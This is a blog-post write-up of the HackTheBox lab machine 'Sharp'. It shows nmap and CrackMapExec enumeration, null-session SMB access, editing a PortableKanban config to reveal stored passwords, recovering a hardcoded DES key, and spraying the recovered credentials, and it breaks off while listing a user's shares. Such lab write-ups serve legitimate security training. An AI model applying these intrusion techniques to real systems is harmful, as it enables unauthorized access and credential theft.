<!DOCTYPE html>
<!--
    So Simple Jekyll Theme 3.2.0
    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
    Free for personal and commercial use under the MIT license
    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
-->
<html lang="en-US" class="no-js">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  

  
    <title>HackTheBox - Sharp</title>
    <meta name="description" content="Hi, after a long time not posting anything on this blog because of my university workload. Let‚Äôs get back to our normal routine of pwning. Today, I will do a...">
    <link rel="canonical" href="https://legiahuyy.github.io/blog/en/hackthebox/HTB-Sharp/">
  

  <script>
    /* Cut the mustard */
    if ( 'querySelector' in document && 'addEventListener' in window ) {
      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
    }
  </script>
  <link rel="apple-touch-icon" sizes="180x180" href="./assets/img/favicons/apple-touch-icon.png">
  <link rel="stylesheet" href="/blog/en/assets/css/main.css">
  <link rel="stylesheet" href="/blog/en/assets/css/skins/default.css">
  
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i">
  <link rel="alternate" type="application/atom+xml" title="Another infosec blog" href="/blog/en/atom.xml">
<!-- start custom head snippets -->

<!-- insert favicons. use http://realfavicongenerator.net/ -->
<link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png">

<!-- end custom head snippets -->

</head>


  <body class="layout--post  hackthebox-sharp">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    
  <div class="navigation-wrapper">
    <a href="#menu-toggle" id="menu-toggle">Menu</a>
    <nav id="primary-nav" class="site-nav animated drop">
      <ul><li><a href="/blog/en/">Home</a></li><li><a href="/blog/en/posts/">Posts</a></li><li><a href="/blog/en/categories/">Categories</a></li><li><a href="/blog/en/tags/">Tags</a></li><li><a href="/blog/en/search/">Search</a></li><li><a href="https://www.buymeacoffee.com/7Bkc3SH">Support</a></li></ul>
    </nav>
  </div><!-- /.navigation-wrapper -->


    <header class="masthead">
  <div class="wrap">
    
      <a href="/blog/en/" class="site-logo" rel="home" title="Another infosec blog">
        <img src="/blog/en/assets/img/avatar.gif" class="site-logo-img animated fadeInDown" alt="Another infosec blog">
      </a>
    
    
    
      
        <div class="site-title animated fadeIn"><a href="/blog/en/">Another infosec blog</a></div>
      
      <p class="site-description animated fadeIn" itemprop="description">Where one's enthusiasm provides knowledge and comprehension for others.</p>
    
  </div>
</header><!-- /.masthead -->


    <main id="main" class="main-content" aria-label="Content">
  <article class="h-entry">
    

    <div class="page-wrapper">
      <header class="page-header">
        
        
          <h1 id="page-title" class="page-title p-name">HackTheBox - Sharp
</h1>
        
      </header>

      <div class="page-sidebar">
        <div class="page-author h-card p-author"><div class="author-info"><div class="author-name">
        <em>by</em> <span class="p-name">The Archivist</span>
      </div><ul class="author-links"><li class="author-link">
            <a class="u-url" rel="me" href="https://twitter.com/0x7c00"><i class="fab fa-twitter-square fa-lg" title="Twitter"></i></a>
          </li></ul>

<span class="read-time">13 min read</span>

    <time class="page-date dt-published" datetime="2021-05-16T02:45:00+07:00"><a class="u-url" href="">May 16, 2021</a>
</time>

  </div>
</div>

        
  <h3 class="page-taxonomies-title">Categories</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="/blog/en/categories/#hackthebox" title="Pages filed under hackthebox">hackthebox</a></li>
  </ul>


        
  <h3 class="page-taxonomies-title">Tags</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a href="/blog/en/tags/#hackthebox" title="Pages tagged hackthebox" rel="tag">hackthebox</a></li><li class="page-taxonomy"><a href="/blog/en/tags/#network" title="Pages tagged network" rel="tag">network</a></li><li class="page-taxonomy"><a href="/blog/en/tags/#pwn" title="Pages tagged pwn" rel="tag">pwn</a></li>
  </ul>


      </div>

      <div class="page-content">
        <div class="e-content">
          <p>Hi, after a long time not posting anything on this blog because of my university workload. Let‚Äôs get back to our normal routine of pwning. Today, I will do a writeup of retired <a href="https://www.hackthebox.eu/">HackTheBox</a> (HTB) machine - Sharp, which is rated 4.8 pts.</p>

<p>For anyone who doesn‚Äôt know about HTB, it‚Äôs an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.</p>

<h2 id="enumeration">Enumeration</h2>

<p>On the very first step, we want to do a nmap scan on the target (10.10.10.219).</p>

<h3 id="nmap-output">Nmap output</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219</span>

Nmap scan report <span class="k">for </span>10.10.10.219
Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: <span class="nt">-48m56s</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-05-13T08:54:52
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>

Nmap <span class="k">done </span>at Thu May 13 05:44:27 2021 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>133.29 seconds
</code></pre></div></div>

<p>Nmap results provide us with different ports and services currently running on the remote host. However, we probably should focus on its SMB service.</p>

<h3 id="in-depth-enumeration-with-crackmapexec-cme">In-depth enumeration with CrackMapExec (CME)</h3>

<p>Instead of the old-fashioned Metasploit‚Äôs auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>apt-get <span class="nb">install </span>crackmapexec
</code></pre></div></div>

<p>or you can have it by cloning into <a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a>/<strong><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></strong> but you will need <a href="https://python-poetry.org/docs/#installation">Poetry</a> to manage dependencies.</p>

<h4 id="os-version">OS version</h4>

<p>Now, let‚Äôs check our target‚Äôs OS version using CME (Windows 10.0 Build 17763 x64).</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/opt/CrackMapExec]
‚îî‚îÄ# poetry run crackmapexec.spec smb 10.10.10.219         
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<h4 id="shared-objects--access">Shared objects &amp; Access</h4>

<p>Next, I‚Äôd like to login using empty username and password, a null-session, to get some free share-objects on the machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/opt/CrackMapExec]
‚îî‚îÄ# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>  
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>-] Sharp<span class="se">\:</span> STATUS_ACCESS_DENIED 
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.219    445    SHARP            Share           Permissions     Remark
SMB         10.10.10.219    445    SHARP            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.219    445    SHARP            ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.219    445    SHARP            C<span class="nv">$ </span>                             Default share
SMB         10.10.10.219    445    SHARP            dev                             
SMB         10.10.10.219    445    SHARP            IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.219    445    SHARP            kanban          READ            
</code></pre></div></div>

<p>The most notable one here is the <code class="language-plaintext highlighter-rouge">kanban</code> share-directory because we don‚Äôt know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.</p>

<h4 id="spider_plus-json">Spider_plus JSON</h4>

<p>Another thing you can do with CME is using its modules, in this case is <code class="language-plaintext highlighter-rouge">spider_plus</code> to crawl information from target host (directories, file names, sizes, ‚Ä¶) and save it as JSON under <code class="language-plaintext highlighter-rouge">/tmp/cme_spider_plus</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/opt/CrackMapExec]
‚îî‚îÄ# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> spider_plus 
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>-] Sharp<span class="se">\:</span> STATUS_ACCESS_DENIED 
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started spidering plus with option:
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        DIR: <span class="o">[</span><span class="s1">'print$'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        EXT: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>       SIZE: 51200
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>     OUTPUT: /tmp/cme_spider_plus

</code></pre></div></div>

<p>So organized, isn‚Äôt it?</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png" alt="" /></p>

<p>These are all the items we can enumerate with a null-session.</p>

<h2 id="kanban-share-files">Kanban share files</h2>

<p>Using smbclient to connect to <code class="language-plaintext highlighter-rouge">kanban</code> directory on remote machine and download files back to our Linux.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Connect to remote host with null credentials</span>
<span class="nv">$ </span>smbclient <span class="nt">-N</span> //10.10.10.219/kanban

<span class="c"># Download all existing files</span>
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
</code></pre></div></div>

<p>You might want to take a look at those <code class="language-plaintext highlighter-rouge">.pk3</code> and <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> files as aforementioned, they are likely to contain useful information.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png" alt="" /></p>

<p>After downloading, you can extract the <code class="language-plaintext highlighter-rouge">pkb.zip</code> using <code class="language-plaintext highlighter-rouge">unzip</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/Sharp/smb/kanban/pkb]
‚îî‚îÄ# unzip pkb.zip     
Archive:  pkb.zip
  inflating: CommandLine.dll         
  inflating: CsvHelper.dll           
  inflating: DotNetZip.dll           
  inflating: Itenso.Rtf.Converter.Html.dll  
  inflating: Itenso.Rtf.Interpreter.dll  
  inflating: Itenso.Rtf.Parser.dll   
  inflating: Itenso.Sys.dll          
  inflating: MsgReader.dll           
  inflating: Ookii.Dialogs.dll       
   creating: Plugins/
  inflating: Plugins/PluginsLibrary.dll  
  inflating: PortableKanban.Data.dll  
  inflating: PortableKanban.exe      
  inflating: PortableKanban.Extensions.dll  
  inflating: ServiceStack.Common.dll  
  inflating: ServiceStack.Interfaces.dll  
  inflating: ServiceStack.Redis.dll  
  inflating: ServiceStack.Text.dll   
  inflating: User Guide.pdf
  
‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/HackTheBox/Sharp/smb/kanban]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">md5sum </span>PortableKanban.pk<span class="k">*</span>
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
   
</code></pre></div></div>

<p>Skim through the files and we have these users in <code class="language-plaintext highlighter-rouge">PortableKanban.pk3</code>.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">/*</span><span class="w"> </span><span class="err">PortableKanban.pk</span><span class="mi">3</span><span class="w"> </span><span class="err">*/</span><span class="w">
  </span><span class="nl">"Users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Administrator"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"k+iUoOvQYG98PuhhRC7/rg=="</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">Base</span><span class="mi">64</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0628ae1de5234b81ae65c246dd2b4a21"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lars"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ua3LyPFM175GN8D3+tqwLA=="</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"User"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769265925600</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<h3 id="reveal-administrator-password-by-re-configurating-kanban-pk3-file">Reveal administrator password by re-configurating Kanban PK3 file</h3>

<p>Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> to decrypt passwords for us since they are stored offline but you‚Äôve might already known that only privileged users can read the password in plain text. Let‚Äôs add ourselves in with <em>Admin</em> role by copy-paste <code class="language-plaintext highlighter-rouge">Administrator</code> section and change the name and id.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">/*</span><span class="w"> </span><span class="err">PortableKanban.pk</span><span class="mi">3</span><span class="w"> </span><span class="err">*/</span><span class="w">
	</span><span class="nl">"Users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Administrator"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"k+iUoOvQYG98PuhhRC7/rg=="</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0628ae1de5234b81ae65c246dd2b4a21"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lars"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ua3LyPFM175GN8D3+tqwLA=="</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"User"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769265925600</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a1"</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">We</span><span class="w"> </span><span class="err">also</span><span class="w"> </span><span class="err">have</span><span class="w"> </span><span class="err">to</span><span class="w"> </span><span class="err">change</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">id</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"huy"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> 					</span><span class="err">//</span><span class="w"> </span><span class="err">Empty</span><span class="w"> </span><span class="err">password</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>Then we execute <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code>, open Users tab in the setup dialog and we are now able to read the passwords.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-13.png" alt="" /></p>

<h3 id="alternative-method">Alternative method</h3>

<p>If you love doing thing <em>the-hard-way</em>, feel free to reverse the program and reproduce its decrypt method. Luckily, <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> and its components are compiled in C# which makes it easier for us.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png" alt="" /></p>

<h4 id="finding-credentials-with-dnspy">Finding credentials with dnSpy</h4>

<p>Load the target‚Äôs executables and DLLs  in dnSpy, we can have their decrypt method. The <code class="language-plaintext highlighter-rouge">Decrypt</code> function reads encrypted string as input, then uses <code class="language-plaintext highlighter-rouge">DESCryptoServiceProvider</code> with hardcoded key and IV to decrypt our string.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png" alt="Crypto.Decrypt" /></p>

<p>On line 62 and 65, from two magic bytes called <code class="language-plaintext highlighter-rouge">_rgbKey</code> and <code class="language-plaintext highlighter-rouge">_rgbIV</code>:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="c1">// Token: 0x04000001 RID: 1</span>
		<span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">_rgbKey</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"7ly6UznJ"</span><span class="p">);</span> <span class="c1">// Hex: 376c7936557a6e4a</span>

		<span class="c1">// Token: 0x04000002 RID: 2</span>
		<span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">_rgbIV</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"XuVUm5fR"</span><span class="p">);</span>	<span class="c1">// Hex: 587556556d356652</span>
</code></pre></div></div>

<p>Talk a little about DES cipher, people use two common mode which are CBC (<strong>cipher block chaining</strong>) and ECB (<strong>electronic code book</strong>). But only CBC supports key and IV in combination to generate the block cipher.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Source: Wikipedia" /></p>

<p>So we are able to decrypt the password using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> with the following recipe will give us our plain password.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png" alt="" /></p>

<h3 id="credentials-spraying-with-cme">Credentials spraying with CME</h3>

<p>In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># users.txt                   </span>
lars
Administrator
                                                                                                    
<span class="c"># passwords.txt </span>
G123HHrth234gRG
G2@<span class="nv">$btRSHJYTarg</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/opt/CrackMapExec]
‚îî‚îÄ# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> ../../users.txt <span class="nt">-p</span> ../../passwords.txt 
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>+] Sharp<span class="se">\l</span>ars:G123HHrth234gRG 
</code></pre></div></div>

<p>Only <code class="language-plaintext highlighter-rouge">lars</code> can log in so we should excluded Administrator credentials for now.</p>

<h3 id="credentials-acquired">Credentials acquired</h3>

<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
      <th>Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Administrator</td>
      <td>G2@$btRSHJYTarg</td>
      <td>Invalid</td>
    </tr>
    <tr>
      <td>lars</td>
      <td>G123HHrth234gRG</td>
      <td>Valid</td>
    </tr>
  </tbody>
</table>

<h2 id="user-level-access">User-level access</h2>

<p>After using <code class="language-plaintext highlighter-rouge">lars</code> credentials, we are able to crawl his shared-objects with <code class="language-plaintext highlighter-rouge">spider_plus</code> module as following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/opt/CrackMapExec]
‚îî‚îÄ# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> lars <span class="nt">-p</span> G123HHrth234gRG <span class="nt">-M</span> spider_plus     2 ‚®Ø
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>+] Sharp<span class="se">\l</span>ars:G123HHrth234gRG 
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started spidering plus with option:
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        DIR: <span class="o">[</span><span class="s1">'print$'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        EXT: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>       SIZE: 51200
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>     OUTPUT: /tmp/cme_spider_plus
</code></pre></div></div>

<p>We made the <code class="language-plaintext highlighter-rouge">.json</code> more readable by filtering out the time and file size.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/kali/HackTheBox/Sharp]
‚îî‚îÄ# <span class="nb">cat </span>10.10.10.219_lars_spider.json | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'time\|size'</span> | <span class="nb">grep</span> <span class="s1">': {'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="se">\"</span> <span class="s1">'{print $2}'</span>  
IPC<span class="nv">$	</span>		<span class="c"># directory</span>
InitShutdown
LSM_API_service
PIPE_EVENTROOT<span class="se">\\</span>CIMV2SCM EVENT PROVIDER
PSHost.132655164003465770.3392.DefaultAppDomain.powershell
W32TIME_ALT
Winsock2<span class="se">\\</span>CatalogChangeListener-154-0
Winsock2<span class="se">\\</span>CatalogChangeListener-1dc-0
Winsock2<span class="se">\\</span>CatalogChangeListener-268-0
Winsock2<span class="se">\\</span>CatalogChangeListener-274-0
Winsock2<span class="se">\\</span>CatalogChangeListener-36c-0
Winsock2<span class="se">\\</span>CatalogChangeListener-42c-0
atsvc
epmapper
eventlog
lsass
ntsvcs
scerpc
srvsvc
vgauth-service
wkssvc
dev				<span class="c"># directory</span>
Client.exe
RemotingLibrary.dll
Server.exe
notes.txt
</code></pre></div></div>

